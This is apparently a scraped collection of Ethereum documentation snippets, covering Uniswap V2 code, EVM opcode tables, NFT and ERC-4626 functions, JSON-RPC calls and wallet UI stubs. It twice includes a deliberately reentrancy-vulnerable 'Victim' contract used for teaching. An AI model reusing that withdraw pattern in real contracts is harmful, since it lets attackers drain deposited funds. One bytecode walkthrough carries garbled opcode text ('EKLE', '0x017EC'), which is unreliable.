              hex'ff',\n                factory,\n                keccak256(abi.encodePacked(token0, token1)),\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n            ))));\n    }\n```\n\n----------------------------------------\n\nTITLE: Ethereum Virtual Machine PUSH Opcodes Reference Table\nDESCRIPTION: A comprehensive reference table documenting PUSH opcodes in the Ethereum Virtual Machine. Each entry shows the opcode in hexadecimal, operation name (PUSH11-PUSH31), gas cost (3 for all), Solidity data type correlation (uint88-uint248), and describes the functionality of pushing the specified byte-length value onto the stack.\n\nLANGUAGE: markdown\nCODE:\n```\n|  6A   | PUSH11         |                                                3                                                | `.`                                                                                       | `uint88`                        |                                                                               | push 11-byte value onto stack                                                                                                    |\n|  6B   | PUSH12         |                                                3                                                | `.`                                                                                       | `uint96`                        |                                                                               | push 12-byte value onto stack                                                                                                    |\n|  6C   | PUSH13         |                                                3                                                | `.`                                                                                       | `uint104`                       |                                                                               | push 13-byte value onto stack                                                                                                    |\n|  6D   | PUSH14         |                                                3                                                | `.`                                                                                       | `uint112`                       |                                                                               | push 14-byte value onto stack                                                                                                    |\n|  6E   | PUSH15         |                                                3                                                | `.`                                                                                       | `uint120`                       |                                                                               | push 15-byte value onto stack                                                                                                    |\n|  6F   | PUSH16         |                                                3                                                | `.`                                                                                       | `uint128`                       |                                                                               | push 16-byte value onto stack                                                                                                    |\n|  70   | PUSH17         |                                                3                                                | `.`                                                                                       | `uint136`                       |                                                                               | push 17-byte value onto stack                                                                                                    |\n|  71   | PUSH18         |                                                3                                                | `.`                                                                                       | `uint144`                       |                                                                               | push 18-byte value onto stack                                                                                                    |\n|  72   | PUSH19         |                                                3                                                | `.`                                                                                       | `uint152`                       |                                                                               | push 19-byte value onto stack                                                                                                    |\n|  73   | PUSH20         |                                                3                                                | `.`                                                                                       | `uint160`                       |                                                                               | push 20-byte value onto stack                                                                                                    |\n|  74   | PUSH21         |                                                3                                                | `.`                                                                                       | `uint168`                       |                                                                               | push 21-byte value onto stack                                                                                                    |\n|  75   | PUSH22         |                                                3                                                | `.`                                                                                       | `uint176`                       |                                                                               | push 22-byte value onto stack                                                                                                    |\n|  76   | PUSH23         |                                                3                                                | `.`                                                                                       | `uint184`                       |                                                                               | push 23-byte value onto stack                                                                                                    |\n|  77   | PUSH24         |                                                3                                                | `.`                                                                                       | `uint192`                       |                                                                               | push 24-byte value onto stack                                                                                                    |\n|  78   | PUSH25         |                                                3                                                | `.`                                                                                       | `uint200`                       |                                                                               | push 25-byte value onto stack                                                                                                    |\n|  79   | PUSH26         |                                                3                                                | `.`                                                                                       | `uint208`                       |                                                                               | push 26-byte value onto stack                                                                                                    |\n|  7A   | PUSH27         |                                                3                                                | `.`                                                                                       | `uint216`                       |                                                                               | push 27-byte value onto stack                                                                                                    |\n|  7B   | PUSH28         |                                                3                                                | `.`                                                                                       | `uint224`                       |                                                                               | push 28-byte value onto stack                                                                                                    |\n|  7C   | PUSH29         |                                                3                                                | `.`                                                                                       | `uint232`                       |                                                                               | push 29-byte value onto stack                                                                                                    |\n|  7D   | PUSH30         |                                                3                                                | `.`                                                                                       | `uint240`                       |                                                                               | push 30-byte value onto stack                                                                                                    |\n|  7E   | PUSH31         |                                                3                                                | `.`                                                                                       | `uint248`                       |                                                                               | push 31-byte value onto stack                                                                                                    |\n```\n\n----------------------------------------\n\nTITLE: Ethereum Virtual Machine PUSH Opcodes Reference Table\nDESCRIPTION: A comprehensive reference table documenting PUSH opcodes in the Ethereum Virtual Machine. Each entry shows the opcode in hexadecimal, operation name (PUSH11-PUSH31), gas cost (3 for all), Solidity data type correlation (uint88-uint248), and describes the functionality of pushing the specified byte-length value onto the stack.\n\nLANGUAGE: markdown\nCODE:\n```\n|  6A   | PUSH11         |                                                3                                                | `.`                                                                                       | `uint88`                        |                                                                               | push 11-byte value onto stack                                                                                                    |\n|  6B   | PUSH12         |                                                3                                                | `.`                                                                                       | `uint96`                        |                                                                               | push 12-byte value onto stack                                                                                                    |\n|  6C   | PUSH13         |                                                3                                                | `.`                                                                                       | `uint104`                       |                                                                               | push 13-byte value onto stack                                                                                                    |\n|  6D   | PUSH14         |                                                3                                                | `.`                                                                                       | `uint112`                       |                                                                               | push 14-byte value onto stack                                                                                                    |\n|  6E   | PUSH15         |                                                3                                                | `.`                                                                                       | `uint120`                       |                                                                               | push 15-byte value onto stack                                                                                                    |\n|  6F   | PUSH16         |                                                3                                                | `.`                                                                                       | `uint128`                       |                                                                               | push 16-byte value onto stack                                                                                                    |\n|  70   | PUSH17         |                                                3                                                | `.`                                                                                       | `uint136`                       |                                                                               | push 17-byte value onto stack                                                                                                    |\n|  71   | PUSH18         |                                                3                                                | `.`                                                                                       | `uint144`                       |                                                                               | push 18-byte value onto stack                                                                                                    |\n|  72   | PUSH19         |                                                3                                                | `.`                                                                                       | `uint152`                       |                                                                               | push 19-byte value onto stack                                                                                                    |\n|  73   | PUSH20         |                                                3                                                | `.`                                                                                       | `uint160`                       |                                                                               | push 20-byte value onto stack                                                                                                    |\n|  74   | PUSH21         |                                                3                                                | `.`                                                                                       | `uint168`                       |                                                                               | push 21-byte value onto stack                                                                                                    |\n|  75   | PUSH22         |                                                3                                                | `.`                                                                                       | `uint176`                       |                                                                               | push 22-byte value onto stack                                                                                                    |\n|  76   | PUSH23         |                                                3                                                | `.`                                                                                       | `uint184`                       |                                                                               | push 23-byte value onto stack                                                                                                    |\n|  77   | PUSH24         |                                                3                                                | `.`                                                                                       | `uint192`                       |                                                                               | push 24-byte value onto stack                                                                                                    |\n|  78   | PUSH25         |                                                3                                                | `.`                                                                                       | `uint200`                       |                                                                               | push 25-byte value onto stack                                                                                                    |\n|  79   | PUSH26         |                                                3                                                | `.`                                                                                       | `uint208`                       |                                                                               | push 26-byte value onto stack                                                                                                    |\n|  7A   | PUSH27         |                                                3                                                | `.`                                                                                       | `uint216`                       |                                                                               | push 27-byte value onto stack                                                                                                    |\n|  7B   | PUSH28         |                                                3                                                | `.`                                                                                       | `uint224`                       |                                                                               | push 28-byte value onto stack                                                                                                    |\n|  7C   | PUSH29         |                                                3                                                | `.`                                                                                       | `uint232`                       |                                                                               | push 29-byte value onto stack                                                                                                    |\n|  7D   | PUSH30         |                                                3                                                | `.`                                                                                       | `uint240`                       |                                                                               | push 30-byte value onto stack                                                                                                    |\n|  7E   | PUSH31         |                                                3                                                | `.`                                                                                       | `uint248`                       |                                                                               | push 31-byte value onto stack                                                                                                    |\n```\n\n----------------------------------------\n\nTITLE: Reading an Entry from the WORM Contract\nDESCRIPTION: JavaScript code demonstrating how to read an entry from the WORM contract by removing the cache flag from the key and using the standard read function.\n\nLANGUAGE: javascript\nCODE:\n```\n// Read the entry just written\nconst realKey = '0x' + key.slice(4)  // remove the FF flag\nconst entryRead = await worm.readEntry(realKey)\n```\n\n----------------------------------------\n\nTITLE: Taking Ownership of Pizza Token in Solidity\nDESCRIPTION: Implements the takeOwnership function that allows an approved address to claim ownership of a specific pizza token. It requires the caller to be either the owner or an approved address.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction takeOwnership(uint256 _pizzaId) public {\n    require(_isApprovedOrOwner(msg.sender, _pizzaId), \"Address is not approved.\");\n    address owner = this.ownerOf(_pizzaId);\n    this.transferFrom(owner, msg.sender, _pizzaId);\n}\n```\n\n----------------------------------------\n\nTITLE: Ethereum Information Banner About ETH2 Terminology\nDESCRIPTION: An informational banner component that clarifies the deprecated 'ETH2' terminology, explaining how the term was phased out in favor of more precise language to describe Ethereum's consensus and execution layers.\n\nLANGUAGE: html\nCODE:\n```\n<InfoBanner mb={8}>\n  <h4 style={{ marginTop: 0 }}>What was ETH2?</h4>\n\n  <p>The term 'Eth2' was commonly used to describe the future of Ethereum before the switch to <a href=\"/glossary/#pos\">proof-of-stake</a> but it was <strong>phased out in favor of more precise terminology.</strong> It was originally used to differentiate the Ethereum network before the switch to proof-of-stake and the network after, or sometimes to refer to the different Ethereum clients (<a href=\"/glossary/#execution-client\">execution clients</a> were sometimes referred to as ETH1 clients and <a href=\"/glossary/#consensus-client\">consensus clients</a> were sometimes referred to as ETH2 clients).</p>\n\n</InfoBanner>\n```\n\n----------------------------------------\n\nTITLE: Internal Function for Token Transfer Logic\nDESCRIPTION: The core internal function that implements token transfer logic. It consolidates all required checks, updates ownership records, clears approvals, and emits the Transfer event after a successful transfer.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _transferFrom(_from: address, _to: address, _tokenId: uint256, _sender: address):\n    \"\"\"\n    @dev Execute transfer of a NFT.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT. (NOTE: `msg.sender` not allowed in private function so pass `_sender`.)\n         Throws if `_to` is the zero address.\n         Throws if `_from` is not the current owner.\n         Throws if `_tokenId` is not a valid NFT.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(_sender, _tokenId)\n    # Throws if `_to` is the zero address\n    assert _to != ZERO_ADDRESS\n    # Clear approval. Throws if `_from` is not the current owner\n    self._clearApproval(_from, _tokenId)\n    # Remove NFT. Throws if `_tokenId` is not a valid NFT\n    self._removeTokenFrom(_from, _tokenId)\n    # Add NFT\n    self._addTokenTo(_to, _tokenId)\n    # Log the transfer\n    log Transfer(_from, _to, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Contrat intelligent AmIRichAlready avec interface IERC20\nDESCRIPTION: Contrat Solidity qui vérifie si un utilisateur possède suffisamment de jetons ERC20 pour être considéré comme riche. Il dépend d'un contrat ERC20 externe.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.2;\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract AmIRichAlready {\n    IERC20 private tokenContract;\n    uint public richness = 1000000 * 10 ** 18;\n\n    constructor (IERC20 _tokenContract) public {\n        tokenContract = _tokenContract;\n    }\n\n    function check() public view returns (bool) {\n        uint balance = tokenContract.balanceOf(msg.sender);\n        return balance > richness;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Alchemy Web3 Client in JavaScript\nDESCRIPTION: Code snippet for initializing the Alchemy Web3 client in Node.js. This creates a Web3 instance connected to Alchemy's Ethereum node infrastructure using your API key.\n\nLANGUAGE: javascript\nCODE:\n```\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(\n  \"https://eth-mainnet.alchemyapi.io/v2/your-api-key\"\n)\n```\n\n----------------------------------------\n\nTITLE: Paramètres pour web3_sha3 en JavaScript\nDESCRIPTION: Exemple de paramètres pour la méthode web3_sha3 qui prend une chaîne hexadécimale représentant les données à hacher.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\"0x68656c6c6f20776f726c64\"]\n```\n\n----------------------------------------\n\nTITLE: Importing Wallet Functions in React Component\nDESCRIPTION: This snippet shows the import statements and state initialization in the Minter.js React component. It sets up the necessary state variables for wallet address, status messages, and NFT metadata.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useEffect, useState } from \"react\";\nimport { connectWallet } from \"./utils/interact.js\";\n\nconst Minter = (props) => {\n\n  //State variables\n  const [walletAddress, setWallet] = useState(\"\");\n  const [status, setStatus] = useState(\"\");\n  const [name, setName] = useState(\"\");\n  const [description, setDescription] = useState(\"\");\n  const [url, setURL] = useState(\"\");\n```\n\n----------------------------------------\n\nTITLE: Cloning the Git Repository for Parameter Caching Example\nDESCRIPTION: Command to clone the repository containing the parameter caching example code.\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://github.com/qbzzt/20220915-all-you-can-cache.git\n```\n\n----------------------------------------\n\nTITLE: Testing Contract Return Values with Mocked Responses\nDESCRIPTION: Testing the AmIRichAlready contract by mocking the ERC20 balanceOf function to return specific values and verifying the contract's response.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"returns false if the wallet has less than 1000000 tokens\", async () => {\n  await mockERC20.mock.balanceOf.returns(utils.parseEther(\"999999\"))\n  expect(await contract.check()).to.be.equal(false)\n})\n```\n\n----------------------------------------\n\nTITLE: Validating Mint Recipient and Executing Mint in Vyper\nDESCRIPTION: This code ensures the mint recipient isn't the zero address, adds the token to the recipient's collection, and emits a Transfer event from the zero address. It returns true to indicate success.\n\nLANGUAGE: python\nCODE:\n```\n    # Throws if `_to` is zero address\n    assert _to != ZERO_ADDRESS\n    # Add NFT. Throws if `_tokenId` is owned by someone\n    self._addTokenTo(_to, _tokenId)\n    log Transfer(ZERO_ADDRESS, _to, _tokenId)\n    return True\n```\n\n----------------------------------------\n\nTITLE: Parameter Validation in 0x81e580d3 Function\nDESCRIPTION: The code section that validates whether the input parameter is less than the value stored at Storage[4], which is a key validation check for the function.\n\nLANGUAGE: evm bytecode\nCODE:\n```\n16F | PUSH1 0x04   | 0x04 calldataload(4) 0xDA\n171 | DUP2         | calldataload(4) 0x04 calldataload(4) 0xDA\n172 | DUP2         | 0x04 calldataload(4) 0x04 calldataload(4) 0xDA\n173 | SLOAD        | Storage[4] calldataload(4) 0x04 calldataload(4) 0xDA\n174 | DUP2         | calldataload(4) Storage[4] calldataload(4) 0x04 calldataload(4) 0xDA\n175 | LT           | calldataload(4)\\<Storage[4] calldataload(4) 0x04 calldataload(4) 0xDA\n176 | PUSH2 0x017e | 0x017EC calldataload(4)\\<Storage[4] calldataload(4) 0x04 calldataload(4) 0xDA\n179 | JUMPI        | calldataload(4) 0x04 calldataload(4) 0xDA\n```\n\n----------------------------------------\n\nTITLE: Stack Manipulation and Jump Operations in 0x81e580d3\nDESCRIPTION: The sequence of stack operations to prepare for the main logic of the function, including the stack reorganization and jump operations.\n\nLANGUAGE: evm bytecode\nCODE:\n```\n1A3 | SWAP2        | 0x0153 CALLDATASIZE calldataload(4) 0xDA\n1A4 | SWAP1        | CALLDATASIZE 0x0153 calldataload(4) 0xDA\n1A5 | POP          | 0x0153 calldataload(4) 0xDA\n1A6 | JUMP         | calldataload(4) 0xDA\n153 | JUMPDEST     | calldataload(4) 0xDA\n154 | PUSH2 0x016e | 0x016E calldataload(4) 0xDA\n157 | JUMP         | calldataload(4) 0xDA\n16E | JUMPDEST     | calldataload(4) 0xDA\n```\n\n----------------------------------------\n\nTITLE: Defining L2StandardERC20 Contract Structure with Bridge References\nDESCRIPTION: Establishes the L2StandardERC20 contract structure with state variables for the L1 token reference and L2 bridge address.\n\nLANGUAGE: solidity\nCODE:\n```\nimport \"./IL2StandardERC20.sol\";\n\ncontract L2StandardERC20 is IL2StandardERC20, ERC20 {\n    address public l1Token;\n    address public l2Bridge;\n```\n\n----------------------------------------\n\nTITLE: L2StandardERC20 Constructor Implementation\nDESCRIPTION: Constructor for L2StandardERC20 that initializes the ERC20 token with name and symbol, and sets up the L1 token and L2 bridge addresses needed for cross-layer functionality.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @param _l2Bridge Address of the L2 standard bridge.\n * @param _l1Token Address of the corresponding L1 token.\n * @param _name ERC20 name.\n * @param _symbol ERC20 symbol.\n */\nconstructor(\n    address _l2Bridge,\n    address _l1Token,\n    string memory _name,\n    string memory _symbol\n) ERC20(_name, _symbol) {\n    l1Token = _l1Token;\n    l2Bridge = _l2Bridge;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Vulnerable Smart Contract in Solidity\nDESCRIPTION: This code snippet shows a basic smart contract that is vulnerable to reentrancy attacks. The contract allows users to deposit and withdraw Ether, but the withdraw function performs external calls before updating the user's balance.\n\nLANGUAGE: solidity\nCODE:\n```\n// This contract is vulnerable. Do not use in production\n\ncontract Victim {\n    mapping (address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n        balances[msg.sender] = 0;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: L2TokenBridge Function for Retrieving L2 Bridge Address\nDESCRIPTION: Defines the l2TokenBridge function that returns the address of the corresponding L2 bridge contract. This function provides symmetry with the L2 bridge interface.\n\nLANGUAGE: solidity\nCODE:\n```\n    /********************\n     * Public Functions *\n     ********************/\n\n    /**\n     * @dev get the address of the corresponding L2 bridge contract.\n     * @return Address of the corresponding L2 bridge contract.\n     */\n    function l2TokenBridge() external returns (address);\n```\n\n----------------------------------------\n\nTITLE: Array Manipulation Contract for Gas Testing\nDESCRIPTION: A Solidity contract demonstrating how array manipulation can impact gas consumption, with functions to push, pop, clear, and check array elements.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  address [] addrs;\n  function push(address a) public {\n    addrs.push(a);\n  }\n  function pop() public {\n    addrs.pop();\n  }\n  function clear() public{\n    addrs.length = 0;\n  }\n  function check() public{\n    for(uint256 i = 0; i < addrs.length; i++)\n      for(uint256 j = i+1; j < addrs.length; j++)\n        if (addrs[i] == addrs[j])\n          addrs[j] = address(0x0);\n  }\n  function echidna_test() public returns (bool) {\n      return true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: React Component Function Stubs for Ethereum Wallet Integration\nDESCRIPTION: Empty function implementations that will handle wallet connection, contract events listening, and message updates in an Ethereum dApp.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\n//called only once\nuseEffect(async () => {\n  //TODO: implement\n}, [])\n\nfunction addSmartContractListener() {\n  //TODO: implement\n}\n\nfunction addWalletListener() {\n  //TODO: implement\n}\n\nconst connectWalletPressed = async () => {\n  //TODO: implement\n}\n\nconst onUpdatePressed = async () => {\n  //TODO: implement\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Overflow Protection in Uniswap V2 (Solidity)\nDESCRIPTION: This code prevents transactions that would cause reserve values to overflow the uint112 data type. It ensures that token balances stay within manageable limits, capping each exchange at approximately 5.1*10^15 tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');\n```\n\n----------------------------------------\n\nTITLE: Including Translatathon Summary Component in React/JSX\nDESCRIPTION: A component that provides a concise overview of the Translatathon event.\n\nLANGUAGE: jsx\nCODE:\n```\n<TranslatathonInANutshell />\n```\n\n----------------------------------------\n\nTITLE: Implementing a Vulnerable Smart Contract in Solidity\nDESCRIPTION: This code snippet shows a basic smart contract that is vulnerable to reentrancy attacks. The contract allows users to deposit and withdraw Ether, but the withdraw function performs external calls before updating the user's balance.\n\nLANGUAGE: solidity\nCODE:\n```\n// This contract is vulnerable. Do not use in production\n\ncontract Victim {\n    mapping (address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n        balances[msg.sender] = 0;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Simple Ethereum Contract Storage Example in Serpent\nDESCRIPTION: A basic Serpent code example showing how a contract can store data in its storage. This contract checks if a value exists at a specific storage location, and if not, it stores a new value provided in the transaction data.\n\nLANGUAGE: python\nCODE:\n```\nif !self.storage[calldataload(0)]:\n  self.storage[calldataload(0)] = calldataload(32)\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Name Registration System in Ethereum\nDESCRIPTION: A simple Ethereum contract that mimics Namecoin functionality by allowing users to register names with associated values in a permanent database. Once a name is registered, it cannot be modified or removed, creating a persistent record on the blockchain.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n  if !self.storage[name]:\n    self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Simulating Redemption Effects in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function allows users to simulate the effects of redeeming shares at the current block, showing how many assets they would receive.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewRedeem(uint256 shares) public view returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Previewing Withdrawal Effects in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function allows users to simulate the effects of their withdrawal in the current block.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewWithdraw(uint256 assets) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Generating Cache in Ethash\nDESCRIPTION: Function to produce the Ethash cache from a seed value. The process involves creating an initial dataset sequentially using SHA-3 hashing, then applying multiple rounds of the RandMemoHash algorithm.\n\nLANGUAGE: python\nCODE:\n```\ndef mkcache(cache_size, seed):\n    n = cache_size // HASH_BYTES\n\n    # Sequentially produce the initial dataset\n    o = [sha3_512(seed)]\n    for i in range(1, n):\n        o.append(sha3_512(o[-1]))\n\n    # Use a low-round version of randmemohash\n    for _ in range(CACHE_ROUNDS):\n        for i in range(n):\n            v = o[i][0] % n\n            o[i] = sha3_512(map(xor, o[(i-1+n) % n], o[v]))\n\n    return o\n```\n\n----------------------------------------\n\nTITLE: Handling Input Field Changes for New Greeting\nDESCRIPTION: Defines an event handler function for when the user types in the input field, updating the newGreeting state variable with the current value from the input element.\n\nLANGUAGE: tsx\nCODE:\n```\n  const greetingChange : ChangeEventHandler<HTMLInputElement> = (evt) => \n    setNewGreeting(evt.target.value)\n```\n\n----------------------------------------\n\nTITLE: Estimating Gas for Contract Deployment via JSON-RPC\nDESCRIPTION: Curl command that calls the eth_estimateGas method to calculate how much gas is required to deploy the contract bytecode.\n\nLANGUAGE: bash\nCODE:\n```\ncurl --data '{\"jsonrpc\":\"2.0\",\"method\": \"eth_estimateGas\", \"params\": [{\"from\": \"0x9b1d35635cc34752ca54713bb99d38614f63c955\", \"data\": \"0x6060604052341561000f57600080fd5b60eb8061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063c6888fa1146044575b600080fd5b3415604e57600080fd5b606260048080359060200190919050506078565b6040518082815260200191505060405180910390f35b60007f24abdb5865df5079dcc5ac590ff6f01d5c16edbc5fab4e195d9febd1114503da600783026040518082815260200191505060405180910390a16007820290509190505600a165627a7a7230582040383f19d9f65246752244189b02f56e8d0980ed44e7a56c0b200458caad20bb0029\"}], \"id\": 5}' -H \"Content-Type: application/json\" localhost:8545\n{\"jsonrpc\":\"2.0\",\"id\":5,\"result\":\"0x1c31e\"}\n```\n\n----------------------------------------\n\nTITLE: Création d'un fichier de métadonnées NFT pour IPFS\nDESCRIPTION: Exemple de structure JSON pour les métadonnées d'un NFT, incluant des attributs, une description, un lien vers l'image IPFS et un nom.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"attributes\": [\n    {\n      \"trait_type\": \"Breed\",\n      \"value\": \"Maltipoo\"\n    },\n    {\n      \"trait_type\": \"Eye color\",\n      \"value\": \"Mocha\"\n    }\n  ],\n  \"description\": \"The world's most adorable and sensitive pup.\",\n  \"image\": \"ipfs://QmWmvTJmJU3pozR9ZHFmQC2DNDwi2XJtf3QGyYiiagFSWb\",\n  \"name\": \"Ramses\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Environment Variables for Pinata API in .env File\nDESCRIPTION: Example of environment variables configuration for storing Pinata API key and secret that will be used for uploading NFT metadata to IPFS.\n\nLANGUAGE: text\nCODE:\n```\nREACT_APP_PINATA_KEY = <pinata-api-key>\nREACT_APP_PINATA_SECRET = <pinata-api-secret>\n```\n\n----------------------------------------\n\nTITLE: Implementing Multi-Hop Swap Calculations in UniswapV2Library\nDESCRIPTION: Functions for calculating amounts when swapping through multiple pairs (multi-hop). getAmountsOut calculates output amounts across a path, while getAmountsIn calculates input amounts needed for a desired output across a path.\n\nLANGUAGE: solidity\nCODE:\n```\n    // performs chained getAmountOut calculations on any number of pairs\n    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {\n        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[0] = amountIn;\n        for (uint i; i < path.length - 1; i++) {\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n        }\n    }\n\n    // performs chained getAmountIn calculations on any number of pairs\n    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {\n        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[amounts.length - 1] = amountOut;\n        for (uint i = path.length - 1; i > 0; i--) {\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);\n            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Hash Calculation and Final Lookup in 0x81e580d3\nDESCRIPTION: The final section of the function that calculates a storage slot using SHA3 and the parameter value, then loads and returns the value from that storage location.\n\nLANGUAGE: evm bytecode\nCODE:\n```\n184 | PUSH1 0x20 | 0x20 calldataload(4) 0x00 calldataload(4) 0xDA\n186 | SWAP1      | calldataload(4) 0x20 0x00 calldataload(4) 0xDA\n187 | SWAP2      | 0x00 0x20 calldataload(4) calldataload(4) 0xDA\n188 | SHA3       | (((SHA3 of 0x00-0x1F))) calldataload(4) calldataload(4) 0xDA\n189 | EKLE       | (((SHA3 of 0x00-0x1F)))+calldataload(4) calldataload(4) 0xDA\n18A | SLOAD      | Storage[(((SHA3 of 0x00-0x1F))) + calldataload(4)] calldataload(4) 0xDA\n```\n\n----------------------------------------\n\nTITLE: Calculating Gas Price for Deflationary Ethereum\nDESCRIPTION: Mathematical formula to determine the average gas price (in gwei) needed to offset Ethereum's daily ETH issuance, making the network deflationary.\n\nLANGUAGE: markdown\nCODE:\n```\n- `7 200 blocs/jour * 15x10^6 gaz/bloc *`**` Y gwei/gaz`**`* 1 ETH/ 10^9 gwei = 1 700 ETH/jour`\n\nEn cherchant `Y` :\n\n- `Y = (1 700(10^9))/(7 200 * 15(10^6)) = (17x10^3)/(72 * 15) = 16 gwei` (arrondi à seulement deux chiffres significatifs)\n```\n\n----------------------------------------\n\nTITLE: Calculating Gas Price for Deflationary Ethereum\nDESCRIPTION: Mathematical formula to determine the average gas price (in gwei) needed to offset Ethereum's daily ETH issuance, making the network deflationary.\n\nLANGUAGE: markdown\nCODE:\n```\n- `7 200 blocs/jour * 15x10^6 gaz/bloc *`**` Y gwei/gaz`**`* 1 ETH/ 10^9 gwei = 1 700 ETH/jour`\n\nEn cherchant `Y` :\n\n- `Y = (1 700(10^9))/(7 200 * 15(10^6)) = (17x10^3)/(72 * 15) = 16 gwei` (arrondi à seulement deux chiffres significatifs)\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_getBalance en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir le solde du compte d'une adresse donnée en utilisant la méthode eth_getBalance. Nécessite l'adresse du compte et le numéro de bloc ou un tag spécial comme paramètres.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBalance\",\"params\":[\"0x407d73d8a49eeb85d32cf465507dd71d507100c1\", \"latest\"],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x0234c8a3397aab58\" // 158972490234375000\n}\n```\n\n----------------------------------------\n\nTITLE: Gaz Ücreti Dengeleme Çözümü\nDESCRIPTION: Dengeleme formülündeki Y (gwei/gaz) değişkeni için çözüm, 1700 ETH'lik günlük emisyonu dengelemek için gereken ortalama gaz ücretini gösterir.\n\nLANGUAGE: markdown\nCODE:\n```\n- `Y = (1700(10^9))/(7200 * 15(10^6)) = (17x10^3)/(72 * 15) = 16 gwei` (yalnızca iki anlamlı basamağa yuvarlandığında)\n```\n\n----------------------------------------\n\nTITLE: Stack Preparation and Jump Execution in EVM Bytecode\nDESCRIPTION: Prepares the stack and executes a jump to offset 0x01A7 for further processing of the value update. This code arranges values on the stack to facilitate the subsequent overflow check and value update.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n6C | PUSH2 0x0075 | 0x75 Value* CALLVALUE 0 6 CALLVALUE        \n6F | SWAP2        | CALLVALUE Value* 0x75 0 6 CALLVALUE        \n70 | SWAP1        | Value* CALLVALUE 0x75 0 6 CALLVALUE        \n71 | PUSH2 0x01a7 | 0x01A7 Value* CALLVALUE 0x75 0 6 CALLVALUE \n74 | JUMP         |\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Logic in Solidity\nDESCRIPTION: Contains the implementation of the freezeAccount function that updates the frozenAccounts mapping and emits an event. It includes a require statement to check if the account is already frozen.\n\nLANGUAGE: solidity\nCODE:\n```\n{\n    require(!frozenAccounts[addr], \"Account already frozen\");\n    frozenAccounts[addr] = true;\n    emit AccountFrozen(addr);\n}  // freezeAccount\n```\n\n----------------------------------------\n\nTITLE: Définition de l'ABI et de l'adresse du contrat DAI\nDESCRIPTION: Configuration des fonctions ABI nécessaires (transfer et balanceOf) et de l'adresse du contrat DAI pour interagir avec le token ERC20.\n\nLANGUAGE: javascript\nCODE:\n```\nconst ERC20TransferABI = [\n  {\n    constant: false,\n    inputs: [\n      {\n        name: \"_to\",\n        type: \"address\",\n      },\n      {\n        name: \"_value\",\n        type: \"uint256\",\n      },\n    ],\n    name: \"transfer\",\n    outputs: [\n      {\n        name: \"\",\n        type: \"bool\",\n      },\n    ],\n    payable: false,\n    stateMutability: \"nonpayable\",\n    type: \"function\",\n  },\n  {\n    constant: true,\n    inputs: [\n      {\n        name: \"_owner\",\n        type: \"address\",\n      },\n    ],\n    name: \"balanceOf\",\n    outputs: [\n      {\n        name: \"balance\",\n        type: \"uint256\",\n      },\n    ],\n    payable: false,\n    stateMutability: \"view\",\n    type: \"function\",\n  },\n]\n\nconst DAI_ADDRESS = 